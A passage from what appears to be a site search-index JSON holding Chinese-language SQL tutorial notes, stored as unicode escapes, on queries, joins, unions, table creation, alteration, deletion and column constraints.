\u8fd9\u4e2a\u65f6\u5019 A \u964d\u5e8f\uff0cB \u5347\u5e8f\u6392\u5217 order by A ,B desc \u8fd9\u4e2a\u65f6\u5019 A \u5347\u5e8f\uff0cB \u964d\u5e8f\u6392\u5217","title":"3\u3001ORDER BY"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#4insert-into","text":"\uff081\uff09INSERT INTO \u8bed\u53e5\u7528\u4e8e\u5411\u8868\u4e2d\u63d2\u5165\u65b0\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a -- \u7b2c\u4e00\u79cd\u5f62\u5f0f\u65e0\u9700\u6307\u5b9a\u8981\u63d2\u5165\u6570\u636e\u7684\u5217\u540d\uff0c\u53ea\u9700\u63d0\u4f9b\u88ab\u63d2\u5165\u7684\u503c\u5373\u53ef INSERT INTO table_name VALUES (value1,value2,value3,...); -- \u7b2c\u4e8c\u79cd\u5f62\u5f0f\u9700\u8981\u6307\u5b9a\u5217\u540d\u53ca\u88ab\u63d2\u5165\u7684\u503c INSERT INTO table_name (column1,column2,column3,...) VALUES (value1,value2,value3,...); \uff083\uff09\u6ca1\u6709\u6307\u5b9a\u8981\u63d2\u5165\u6570\u636e\u7684\u5217\u540d\u7684\u5f62\u5f0f\u9700\u8981\u5217\u51fa\u63d2\u5165\u884c\u7684\u6bcf\u4e00\u5217\u6570\u636e\uff1b \uff084\uff09insert into select \u548cselect into from \u7684\u533a\u522b\uff0c\u524d\u8005\u91cd\u5728\u66f4\u65b0\u5df2\u5b58\u5728\u8868\u7684\u6570\u636e\uff0c\u540e\u8005\u91cd\u5728\u521b\u5efa\u65b0\u8868\uff1a insert into scorebak select * from socre where neza='neza' --\u63d2\u5165\u4e00\u884c,\u8981\u6c42\u8868scorebak \u5fc5\u987b\u5b58\u5728 select * into scorebak from score where neza='neza' --\u4e5f\u662f\u63d2\u5165\u4e00\u884c,\u8981\u6c42\u8868scorebak \u4e0d\u5b58\u5728 \uff085\uff09INSERT INTO SELECT \u8bed\u53e5\u4ece\u4e00\u4e2a\u8868\u590d\u5236\u6570\u636e\uff0c\u7136\u540e\u628a\u6570\u636e\u63d2\u5165\u5230\u4e00\u4e2a\u5df2\u5b58\u5728\u7684\u8868\u4e2d\uff0c\u76ee\u6807\u8868\u4e2d\u4efb\u4f55\u5df2\u5b58\u5728\u7684\u884c\u90fd\u4e0d\u4f1a\u53d7\u5f71\u54cd\uff1b INSERT INTO table2 (column_name(s)) SELECT column_name(s) FROM table1; -- \u6837\u4f8b INSERT INTO Websites (name, country) SELECT app_name, country FROM apps;","title":"4\u3001INSERT INTO"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#5update","text":"\uff081\uff09UPDATE \u8bed\u53e5\u7528\u4e8e\u66f4\u65b0\u8868\u4e2d\u5df2\u5b58\u5728\u7684\u8bb0\u5f55\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a UPDATE table_name SET column1=value1,column2=value2,... WHERE some_column=some_value; \uff083\uff09 \u8bf7\u6ce8\u610f SQL UPDATE \u8bed\u53e5\u4e2d\u7684 WHERE \u5b50\u53e5\uff01 WHERE \u5b50\u53e5\u89c4\u5b9a\u54ea\u6761\u8bb0\u5f55\u6216\u8005\u54ea\u4e9b\u8bb0\u5f55\u9700\u8981\u66f4\u65b0\u3002\u5982\u679c\u60a8\u7701\u7565\u4e86 WHERE \u5b50\u53e5\uff0c\u6240\u6709\u7684\u8bb0\u5f55\u90fd\u5c06\u88ab\u66f4\u65b0\uff01 \uff084\uff09\u5728 MySQL \u4e2d\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e sql_safe_updates \u8fd9\u4e2a\u81ea\u5e26\u7684\u53c2\u6570\u6765\u89e3\u51b3\uff0c\u5f53\u8be5\u53c2\u6570\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u5fc5\u987b\u5728update \u8bed\u53e5\u540e\u643a\u5e26 where \u6761\u4ef6\uff0c\u5426\u5219\u5c31\u4f1a\u62a5\u9519\uff0c set sql_safe_updates=1; \u8868\u793a\u5f00\u542f\u8be5\u53c2\u6570\uff1b","title":"5\u3001UPDATE"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#6delete","text":"\uff081\uff09DELETE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u884c\uff1b \uff082\uff09\u8bed\u6cd5\u5982\u4e0b\uff1a DELETE FROM table_name WHERE some_column=some_value; \uff083\uff09 \u8bf7\u6ce8\u610f SQL DELETE \u8bed\u53e5\u4e2d\u7684 WHERE \u5b50\u53e5\uff01 WHERE \u5b50\u53e5\u89c4\u5b9a\u54ea\u6761\u8bb0\u5f55\u6216\u8005\u54ea\u4e9b\u8bb0\u5f55\u9700\u8981\u5220\u9664\u3002\u5982\u679c\u60a8\u7701\u7565\u4e86 WHERE \u5b50\u53e5\uff0c\u6240\u6709\u7684\u8bb0\u5f55\u90fd\u5c06\u88ab\u5220\u9664\uff01 \uff084\uff09\u5220\u9664\u6240\u6709\u6570\u636e\uff0c\u8868\u7ed3\u6784\u3001\u5c5e\u6027\u3001\u7d22\u5f15\u5c06\u4fdd\u6301\u4e0d\u53d8\uff1a DELETE FROM table_name; DELETE * FROM table_name; \uff085\uff09\u4e09\u6761\u5220\u9664\u8bed\u53e5\u7684\u533a\u522b\uff1a DROP test; -- \u5220\u9664\u8868test\uff0c\u5e76\u91ca\u653e\u7a7a\u95f4\uff0c\u5c06test\u5220\u9664\u7684\u4e00\u5e72\u4e8c\u51c0 TRUNCATE test; -- \u5220\u9664\u8868test\u91cc\u7684\u5185\u5bb9\uff0c\u5e76\u91ca\u653e\u7a7a\u95f4\uff0c\u4f46\u4e0d\u5220\u9664\u8868\u7684\u5b9a\u4e49\uff0c\u8868\u7684\u7ed3\u6784\u8fd8\u5728 DELETE FROM table_name; -- \u4ec5\u5220\u9664\u8868test\u5185\u7684\u6240\u6709\u5185\u5bb9\uff0c\u4fdd\u7559\u8868\u7684\u5b9a\u4e49\uff0c\u4e0d\u91ca\u653e\u7a7a\u95f4 DELETE * FROM table_name; -- \u4ec5\u5220\u9664\u8868test\u5185\u7684\u6240\u6709\u5185\u5bb9\uff0c\u4fdd\u7559\u8868\u7684\u5b9a\u4e49\uff0c\u4e0d\u91ca\u653e\u7a7a\u95f4 -- \u4e5f\u5c31\u662fdelete\u5220\u9664\u7684\u6570\u636e\u53ef\u4ee5\u6062\u590d\uff0ctruncate\u548cdrop\u5220\u9664\u7684\u6570\u636e\u65e0\u6cd5\u6062\u590d \uff086\uff09\u5728 MySQL \u4e2d\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e sql_safe_updates \u8fd9\u4e2a\u81ea\u5e26\u7684\u53c2\u6570\u6765\u89e3\u51b3\uff0c\u5f53\u8be5\u53c2\u6570\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\uff0c\u4f60\u5fc5\u987b\u5728delete \u8bed\u53e5\u540e\u643a\u5e26 where \u6761\u4ef6\uff0c\u5426\u5219\u5c31\u4f1a\u62a5\u9519\uff0c set sql_safe_updates=1; \u8868\u793a\u5f00\u542f\u8be5\u53c2\u6570\uff1b","title":"6\u3001DELETE"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#7","text":"\uff081\uff09\u5217\u7684 SQL \u522b\u540d\u8bed\u6cd5\uff08\u5982\u679c\u5217\u540d\u79f0\u5305\u542b\u7a7a\u683c\uff0c\u8981\u6c42\u4f7f\u7528\u53cc\u5f15\u53f7\u6216\u65b9\u62ec\u53f7\uff09\uff1a SELECT column_name AS alias_name FROM table_name; -- \u6837\u4f8b SELECT name, CONCAT(url, ', ', alexa, ', ', country) AS site_info FROM Websites; -- \u628a\u4e09\u4e2a\u5217\uff08url\u3001alexa \u548c country\uff09\u7ed3\u5408\u5728\u4e00\u8d77\uff0c\u5e76\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a \"site_info\" \u7684\u522b\u540d \uff082\uff09\u8868\u7684 SQL \u522b\u540d\u8bed\u6cd5\uff1a SELECT column_name(s) FROM table_name AS alias_name; -- \u6837\u4f8b SELECT w.name, w.url, a.count, a.date FROM Websites AS w, access_log AS a WHERE a.site_id=w.id and w.name=\"\u83dc\u9e1f\u6559\u7a0b\"; \uff083\uff09\u5728\u4e0b\u5217\u60c5\u51b5\u4e2d\u4f7f\u7528\u522b\u540d\u5f88\u6709\u7528\uff1a \u5728\u67e5\u8be2\u4e2d\u6d89\u53ca\u8d85\u8fc7\u4e00\u4e2a\u8868 \u5728\u67e5\u8be2\u4e2d\u4f7f\u7528\u4e86\u51fd\u6570 \u5217\u540d\u79f0\u5f88\u957f\u6216\u8005\u53ef\u8bfb\u6027\u5dee \u9700\u8981\u628a\u4e24\u4e2a\u5217\u6216\u8005\u591a\u4e2a\u5217\u7ed3\u5408\u5728\u4e00\u8d77","title":"7\u3001\u522b\u540d"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#8join","text":"\uff081\uff09JOIN \u5b50\u53e5\u7528\u4e8e\u628a\u6765\u81ea\u4e24\u4e2a\u6216\u591a\u4e2a\u8868\u7684\u884c\u7ed3\u5408\u8d77\u6765\uff0c\u57fa\u4e8e\u8fd9\u4e9b\u8868\u4e4b\u95f4\u7684\u5171\u540c\u5b57\u6bb5\uff1b \uff082\uff09\u4e0d\u540c\u7684JOIN\u7c7b\u578b\uff1a INNER JOIN\uff1a\u5982\u679c\u8868\u4e2d\u6709\u81f3\u5c11\u4e00\u4e2a\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c LEFT JOIN\uff1a\u5373\u4f7f\u53f3\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u4e5f\u4ece\u5de6\u8868\u8fd4\u56de\u6240\u6709\u7684\u884c RIGHT JOIN\uff1a\u5373\u4f7f\u5de6\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u4e5f\u4ece\u53f3\u8868\u8fd4\u56de\u6240\u6709\u7684\u884c FULL OUTER JOIN\uff1a\u53ea\u8981\u5176\u4e2d\u4e00\u4e2a\u8868\u4e2d\u5b58\u5728\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c \uff083\uff09MySQL \u6682\u4e0d\u652f\u6301 FULL OUTER JOIN\uff0cMySQL\u5b9e\u73b0\u5b8c\u5168\u5916\u90e8\u94fe\u63a5\uff0c\u8981\u4f7f\u7528 UNION \u5c06\u4e00\u4e2a\u5de6\u94fe\u63a5\u3001\u548c\u4e00\u4e2a\u53f3\u94fe\u63a5\u53bb\u91cd\u5408\u5e76\uff1b SELECT a.*,b.* FROM \u88681 a LEFT JOIN \u88682 b ON a.unit_NO = b.unit_NO UNION SELECT a.*,b.* FROM \u88681 a RIGHT JOIN \u88682 b ON a.unit_NO = b.unit_NO; \uff084\uff09\u9996\u5148\uff0c\u8fde\u63a5\u7684\u7ed3\u679c\u53ef\u4ee5\u5728\u903b\u8f91\u4e0a\u770b\u4f5c\u662f\u7531SELECT\u8bed\u53e5\u6307\u5b9a\u7684\u5217\u7ec4\u6210\u7684\u65b0\u8868\uff0c\u5de6\u8fde\u63a5\u4e0e\u53f3\u8fde\u63a5\u7684\u5de6\u53f3\u6307\u7684\u662f\u4ee5\u4e24\u5f20\u8868\u4e2d\u7684\u54ea\u4e00\u5f20\u4e3a\u57fa\u51c6\uff0c\u5b83\u4eec\u90fd\u662f\u5916\u8fde\u63a5\uff1b \uff085\uff09\u5916\u8fde\u63a5\u5c31\u597d\u50cf\u662f\u4e3a\u975e\u57fa\u51c6\u8868\u6dfb\u52a0\u4e86\u4e00\u884c\u5168\u4e3a\u7a7a\u503c\u7684\u4e07\u80fd\u884c\uff0c\u7528\u6765\u4e0e\u57fa\u51c6\u8868\u4e2d\u627e\u4e0d\u5230\u5339\u914d\u7684\u884c\u8fdb\u884c\u5339\u914d\uff0c\u5047\u8bbe\u4e24\u4e2a\u6ca1\u6709\u7a7a\u503c\u7684\u8868\u8fdb\u884c\u5de6\u8fde\u63a5\uff0c\u5de6\u8868\u662f\u57fa\u51c6\u8868\uff0c\u5de6\u8868\u7684\u6240\u6709\u884c\u90fd\u51fa\u73b0\u5728\u7ed3\u679c\u4e2d\uff0c\u53f3\u8868\u5219\u53ef\u80fd\u56e0\u4e3a\u65e0\u6cd5\u4e0e\u57fa\u51c6\u8868\u5339\u914d\u800c\u51fa\u73b0\u662f\u7a7a\u503c\u7684\u5b57\u6bb5\uff1b \uff086\uff09INNER JOIN \u8bed\u6cd5\uff0c\u5728\u8868\u4e2d\u5b58\u5728\u81f3\u5c11\u4e00\u4e2a\u5339\u914d\u65f6\u8fd4\u56de\u884c\uff1a SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0cINNER JOIN \u4e0e JOIN \u662f\u76f8\u540c\u7684 SELECT column_name(s) FROM table1 JOIN table2 ON table1.column_name=table2.column_name; \uff087\uff09LEFT JOIN \u5173\u952e\u5b57\u4ece\u5de6\u8868\uff08table1\uff09\u8fd4\u56de\u6240\u6709\u7684\u884c\uff0c\u5373\u4f7f\u53f3\u8868\uff08table2\uff09\u4e2d\u6ca1\u6709\u5339\u914d\u3002\u5982\u679c\u53f3\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u5219\u7ed3\u679c\u4e3a NULL\uff1b SELECT column_name(s) FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0c\u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cLEFT JOIN \u79f0\u4e3a LEFT OUTER JOIN SELECT column_name(s) FROM table1 LEFT OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff088\uff09RIGHT JOIN \u5173\u952e\u5b57\u4ece\u53f3\u8868\uff08table2\uff09\u8fd4\u56de\u6240\u6709\u7684\u884c\uff0c\u5373\u4f7f\u5de6\u8868\uff08table1\uff09\u4e2d\u6ca1\u6709\u5339\u914d\u3002\u5982\u679c\u5de6\u8868\u4e2d\u6ca1\u6709\u5339\u914d\uff0c\u5219\u7ed3\u679c\u4e3a NULL\uff1b SELECT column_name(s) FROM table1 RIGHT JOIN table2 ON table1.column_name=table2.column_name; -- \u6216\uff0c\u5728\u67d0\u4e9b\u6570\u636e\u5e93\u4e2d\uff0cRIGHT JOIN \u79f0\u4e3a RIGHT OUTER JOIN SELECT column_name(s) FROM table1 RIGHT OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff089\uff09FULL OUTER JOIN \u5173\u952e\u5b57\u53ea\u8981\u5de6\u8868\uff08table1\uff09\u548c\u53f3\u8868\uff08table2\uff09\u5176\u4e2d\u4e00\u4e2a\u8868\u4e2d\u5b58\u5728\u5339\u914d\uff0c\u5219\u8fd4\u56de\u884c\uff1b SELECT column_name(s) FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name; \uff0810\uff09\u7b80\u5355\u8bb0\u6cd5\uff1a A inner join B \u53d6\u4ea4\u96c6\u3002 A left join B \u53d6 A \u5168\u90e8\uff0cB \u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 A right join B \u53d6 B \u5168\u90e8 A \u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 A full outer join B \u53d6\u5e76\u96c6\uff0c\u5f7c\u6b64\u6ca1\u6709\u5bf9\u5e94\u7684\u503c\u4e3a null\u3002 \u5bf9\u5e94\u6761\u4ef6\u5728 on \u540e\u9762\u586b\u5199\u3002 \uff0811\uff09ON\u7528\u6cd5\uff1a \u6570\u636e\u5e93\u5728\u901a\u8fc7\u8fde\u63a5\u4e24\u5f20\u6216\u591a\u5f20\u8868\u6765\u8fd4\u56de\u8bb0\u5f55\u65f6\uff0c\u90fd\u4f1a\u751f\u6210\u4e00\u5f20\u4e2d\u95f4\u7684\u4e34\u65f6\u8868\uff0c\u7136\u540e\u518d\u5c06\u8fd9\u5f20\u4e34\u65f6\u8868\u8fd4\u56de\u7ed9\u7528\u6237\uff1b on \u6761\u4ef6\u662f\u5728\u751f\u6210\u4e34\u65f6\u8868\u65f6\u4f7f\u7528\u7684\u6761\u4ef6\uff0c\u5b83\u4e0d\u7ba1 on \u4e2d\u7684\u6761\u4ef6\u662f\u5426\u4e3a\u771f\uff0c\u90fd\u4f1a\u8fd4\u56de\u8868\u4e2d\u7684\u8bb0\u5f55\uff1b where \u6761\u4ef6\u662f\u5728\u4e34\u65f6\u8868\u751f\u6210\u597d\u540e\uff0c\u518d\u5bf9\u4e34\u65f6\u8868\u8fdb\u884c\u8fc7\u6ee4\u7684\u6761\u4ef6\uff1b","title":"8\u3001JOIN"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#9union","text":"\uff081\uff09UNION \u64cd\u4f5c\u7b26\u5408\u5e76\u4e24\u4e2a\u6216\u591a\u4e2a SELECT \u8bed\u53e5\u7684\u7ed3\u679c\uff1b \uff082\uff09\u8bf7\u6ce8\u610f\uff0cUNION \u5185\u90e8\u7684\u6bcf\u4e2a SELECT \u8bed\u53e5\u5fc5\u987b\u62e5\u6709\u76f8\u540c\u6570\u91cf\u7684\u5217\uff0c\u5217\u4e5f\u5fc5\u987b\u62e5\u6709\u76f8\u4f3c\u7684\u6570\u636e\u7c7b\u578b\uff0c\u540c\u65f6\uff0c\u6bcf\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u7684\u987a\u5e8f\u5fc5\u987b\u76f8\u540c\uff0cUNION \u7ed3\u679c\u96c6\u4e2d\u7684\u5217\u540d\u603b\u662f\u7b49\u4e8e UNION \u4e2d\u7b2c\u4e00\u4e2a SELECT \u8bed\u53e5\u4e2d\u7684\u5217\u540d\uff1b \uff083\uff09SQL UNION \u8bed\u6cd5\uff1a SELECT column_name(s) FROM table1 UNION SELECT column_name(s) FROM table2; \uff084\uff09\u9ed8\u8ba4\u5730\uff0cUNION \u64cd\u4f5c\u7b26\u9009\u53d6\u4e0d\u540c\u7684\u503c\u3002\u5982\u679c\u5141\u8bb8\u91cd\u590d\u7684\u503c\uff0c\u8bf7\u4f7f\u7528 UNION ALL\uff1b SELECT column_name(s) FROM table1 UNION ALL SELECT column_name(s) FROM table2; \uff085\uff09\u4f7f\u7528UNION\u547d\u4ee4\u65f6\u9700\u8981\u6ce8\u610f\uff0c\u53ea\u80fd\u5728\u6700\u540e\u4f7f\u7528\u4e00\u4e2aORDER BY\u547d\u4ee4\uff0c\u662f\u5c06\u4e24\u4e2a\u67e5\u8be2\u7ed3\u679c\u5408\u5728\u4e00\u8d77\u4e4b\u540e\uff0c\u518d\u8fdb\u884c\u6392\u5e8f\uff01\u7edd\u5bf9\u4e0d\u80fd\u5199\u4e24\u4e2aORDER BY\u547d\u4ee4\uff1b","title":"9\u3001UNION"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#10create","text":"\uff081\uff09CREATE DATABASE \u8bed\u53e5\u7528\u4e8e\u521b\u5efa\u6570\u636e\u5e93\uff1b CREATE DATABASE dbname; \uff082\uff09CREATE TABLE \u8bed\u53e5\u7528\u4e8e\u521b\u5efa\u6570\u636e\u5e93\u4e2d\u7684\u8868\uff0c\u8868\u7531\u884c\u548c\u5217\u7ec4\u6210\uff0c\u6bcf\u4e2a\u8868\u90fd\u5fc5\u987b\u6709\u4e2a\u8868\u540d\uff1b CREATE TABLE table_name ( column_name1 data_type(size), column_name2 data_type(size), column_name3 data_type(size), .... ); /* column_name \u53c2\u6570\u89c4\u5b9a\u8868\u4e2d\u5217\u7684\u540d\u79f0\u3002 data_type \u53c2\u6570\u89c4\u5b9a\u5217\u7684\u6570\u636e\u7c7b\u578b\uff08\u4f8b\u5982 varchar\u3001integer\u3001decimal\u3001date \u7b49\u7b49\uff09\u3002 size \u53c2\u6570\u89c4\u5b9a\u8868\u4e2d\u5217\u7684\u6700\u5927\u957f\u5ea6\u3002 */ \uff083\uff09CREATE INDEX \u8bed\u53e5\u7528\u4e8e\u5728\u8868\u4e2d\u521b\u5efa\u7d22\u5f15\uff0c\u4ee5\u4fbf\u66f4\u52a0\u5feb\u901f\u9ad8\u6548\u5730\u67e5\u8be2\u6570\u636e\uff0c\u7528\u6237\u65e0\u6cd5\u770b\u5230\u7d22\u5f15\uff0c\u66f4\u65b0\u4e00\u4e2a\u5305\u542b\u7d22\u5f15\u7684\u8868\u9700\u8981\u6bd4\u66f4\u65b0\u4e00\u4e2a\u6ca1\u6709\u7d22\u5f15\u7684\u8868\u82b1\u8d39\u66f4\u591a\u7684\u65f6\u95f4\uff0c\u8fd9\u662f\u7531\u4e8e\u7d22\u5f15\u672c\u8eab\u4e5f\u9700\u8981\u66f4\u65b0\uff1b -- \u521b\u5efa\u7b80\u5355\u7d22\u5f15 CREATE INDEX index_name ON table_name (column_name) -- \u521b\u5efa\u552f\u4e00\u7d22\u5f15 CREATE UNIQUE INDEX index_name ON table_name (column_name) -- \u7528\u4e8e\u521b\u5efa\u7d22\u5f15\u7684\u8bed\u6cd5\u5728\u4e0d\u540c\u7684\u6570\u636e\u5e93\u4e2d\u4e0d\u4e00\u6837","title":"10\u3001CREATE"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#11drop","text":"\uff081\uff09DROP INDEX \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\u4e2d\u7684\u7d22\u5f15\uff1b -- \u7528\u4e8e MS Access \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX index_name ON table_name -- \u7528\u4e8e MS SQL Server \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX table_name.index_name -- \u7528\u4e8e DB2/Oracle \u7684 DROP INDEX \u8bed\u6cd5 DROP INDEX index_name -- \u7528\u4e8e MySQL \u7684 DROP INDEX \u8bed\u6cd5 ALTER TABLE table_name DROP INDEX index_name \uff082\uff09DROP TABLE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u8868\uff1b DROP TABLE table_name \uff083\uff09DROP DATABASE \u8bed\u53e5\u7528\u4e8e\u5220\u9664\u6570\u636e\u5e93\uff1b DROP DATABASE database_name \uff084\uff09\u4ec5\u4ec5\u9700\u8981\u5220\u9664\u8868\u5185\u7684\u6570\u636e\uff0c\u4f46\u5e76\u4e0d\u5220\u9664\u8868\u672c\u8eab\u4f7f\u7528TRUNCATE TABLE \u8bed\u53e5\uff1b TRUNCATE TABLE table_name","title":"11\u3001DROP"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#12alter","text":"ALTER TABLE \u8bed\u53e5\u7528\u4e8e\u5728\u5df2\u6709\u7684\u8868\u4e2d\u6dfb\u52a0\u3001\u5220\u9664\u6216\u4fee\u6539\u5217\u3002 \uff081\uff09\u6dfb\u52a0\u5217\uff1b ALTER TABLE table_name ADD column_name datatype \uff082\uff09\u5220\u9664\u5217\uff1b ALTER TABLE table_name DROP COLUMN column_name \uff083\uff09\u4fee\u6539\u5217\uff1b -- SQL Server / MS Access ALTER TABLE table_name ALTER COLUMN column_name datatype -- My SQL / Oracle ALTER TABLE table_name MODIFY COLUMN column_name datatype -- Oracle 10G \u4e4b\u540e\u7248\u672c ALTER TABLE table_name MODIFY column_name datatype \uff084\uff09\u66f4\u6539\u5217\u540d\u548c\u5c5e\u6027 ALTER TABLE table_name change column_name column_name datatype","title":"12\u3001ALTER"},{"location":"RelatedKnowledge/ProgramLanguage/SQL/#13","text":"\uff081\uff09SQL \u7ea6\u675f\u7528\u4e8e\u89c4\u5b9a\u8868\u4e2d\u7684\u6570\u636e\u89c4\u5219\uff0c\u5982\u679c\u5b58\u5728\u8fdd\u53cd\u7ea6\u675f\u7684\u6570\u636e\u884c\u4e3a\uff0c\u884c\u4e3a\u4f1a\u88ab\u7ea6\u675f\u7ec8\u6b62\uff0c\u7ea6\u675f\u53ef\u4ee5\u5728\u521b\u5efa\u8868\u65f6\u89c4\u5b9a\uff08\u901a\u8fc7 CREATE TABLE \u8bed\u53e5\uff09\uff0c\u6216\u8005\u5728\u8868\u521b\u5efa\u4e4b\u540e\u89c4\u5b9a\uff08\u901a\u8fc7 ALTER TABLE \u8bed\u53e5\uff09\uff1b CREATE TABLE table_name ( column_name1 data_type(size) constraint_name, column_name2 data_type(size) constraint_name, column_name3 data_type(size) constraint_name, .... ); \uff082\uff09\u7ea6\u675f\u5206\u7c7b\uff1a NOT NULL - \u6307\u793a\u67d0\u5217\u4e0d\u80fd\u5b58\u50a8 NULL \u503c\u3002 UNIQUE - \u4fdd\u8bc1\u67d0\u5217\u7684\u6bcf\u884c\u5fc5\u987b\u6709\u552f\u4e00\u7684\u503c\u3002 PRIMARY KEY - NOT NULL \u548c UNIQUE \u7684\u7ed3\u5408\u3002\u786e\u4fdd\u67d0\u5217\uff08\u6216\u4e24\u4e2a\u5217\u591a\u4e2a\u5217\u7684\u7ed3\u5408\uff09\u6709\u552f\u4e00\u6807\u8bc6\uff0c\u6709\u52a9\u4e8e\u66f4\u5bb9\u6613\u66f4\u5feb\u901f\u5730\u627e\u5230\u8868\u4e2d\u7684\u4e00\u4e2a\u7279\u5b9a\u7684\u8bb0\u5f55\u3002 FOREIGN KEY - \u4fdd\u8bc1\u4e00\u4e2a\u8868\u4e2d\u7684\u6570\u636e\u5339\u914d\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684\u503c\u7684\u53c2\u7167\u5b8c\u6574\u6027\u3002 CHECK - \u4fdd\u8bc1\u5217\u4e2d\u7684\u503c\u7b26\u5408\u6307\u5b9a\u7684\u6761\u4ef6\u3002 DEFAULT - \u89c4\u5b9a\u6ca1\u6709\u7ed9\u5217\u8d4b\u503c\u65f6\u7684\u9ed8\u8ba4\u503c\u3002 \uff083\uff09NOT NULL \u7ea6\u675f\uff0c\u5728\u9ed8\u8ba4\u7684\u60c5\u51b5\u4e0b\uff0c\u8868\u7684\u5217\u63a5\u53d7 NULL \u503c\uff0cNOT NULL \u7ea6\u675f\u5f3a\u5236\u5217\u4e0d\u63a5\u53d7 NULL \u503c\u8fd9\u610f\u5473\u7740\uff0c\u5982\u679c\u4e0d\u5411\u5b57\u6bb5\u6dfb\u52a0\u503c\uff0c\u5c31\u65e0\u6cd5\u63d2\u5165\u65b0\u8bb0\u5f55\u6216\u8005\u66f4\u65b0\u8bb0\u5f55\uff1b -- \u6837\u4f8b\uff0c\u521b\u5efa\u65f6\u89c4\u5b9aNOT NULL\u7ea6\u675f CREATE TABLE Persons ( ID int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255) NOT NULL, Age int ); -- \u6837\u4f8b\uff0c\u6dfb\u52a0 NOT NULL \u7ea6\u675f ALTER TABLE Persons MODIFY Age int NOT NULL; -- \u6837\u4f8b\uff0c\u5220\u9664 NOT NULL \u7ea6\u675f ALTER TABLE Persons MODIFY Age int NULL; \uff084\uff09UNIQUE \u7ea6\u675f\uff0c\u552f\u4e00\u6807\u8bc6\u6570\u636e\u5e93\u8868\u4e2d\u7684\u6bcf\u6761\u8bb0\u5f55\uff0cUNIQUE \u548c PRIMARY KEY \u7ea6\u675f\u5747\u4e3a\u5217\u6216\u5217\u96c6\u5408\u63d0\u4f9b\u4e86\u552f\u4e00\u6027\u7684\u4fdd\u8bc1\uff0cPRIMARY KEY \u7ea6\u675f\u62e5\u6709\u81ea\u52a8\u5b9a\u4e49\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u6ce8\u610f\uff0c\u6bcf\u4e2a\u8868\u53ef\u4ee5\u6709\u591a\u4e2a UNIQUE \u7ea6\u675f\uff0c\u4f46\u662f\u6bcf\u4e2a\u8868\u53ea\u80fd\u6709\u4e00\u4e2a PRIMARY KEY \u7ea6\u675f\uff1b -- CREATE TABLE \u65f6\u7684 SQL UNIQUE \u7ea6\u675f -- MySQL CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), UNIQUE (P_Id) ) -- SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL UNIQUE, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255) ) -- \u5982\u9700\u547d\u540d UNIQUE \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access CREATE TABLE Persons ( P_Id int NOT NULL, LastName varchar(255) NOT NULL, FirstName varchar(255), Address varchar(255), City varchar(255), CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName) ) -- ALTER TABLE \u65f6\u7684 SQL UNIQUE \u7ea6\u675f -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD UNIQUE (P_Id) -- \u5982\u9700\u547d\u540d UNIQUE \u7ea6\u675f\uff0c\u5e76\u5b9a\u4e49\u591a\u4e2a\u5217\u7684 UNIQUE \u7ea6\u675f\uff0c\u8bf7\u4f7f\u7528\u4e0b\u9762\u7684 SQL \u8bed\u6cd5 -- MySQL / SQL Server / Oracle / MS Access ALTER TABLE Persons ADD CONSTRAINT uc_PersonID UNIQUE (P_Id,LastName) -- \u64a4\u9500 UNIQUE \u7ea6\u675f -- MySQL ALTER TABLE Persons DROP INDEX uc_PersonID -- SQL Server / Oracle / MS Access ALTER TABLE Persons DROP CONSTRAINT uc_PersonID -- uc_PersonID \u662f\u4e00\u4e2a\u7ea6\u675f\u540d\uff0c\u53ef\u4ee5\u81ea\u884c\u62df\u5b9a \uff085\uff09PRIMARY KEY 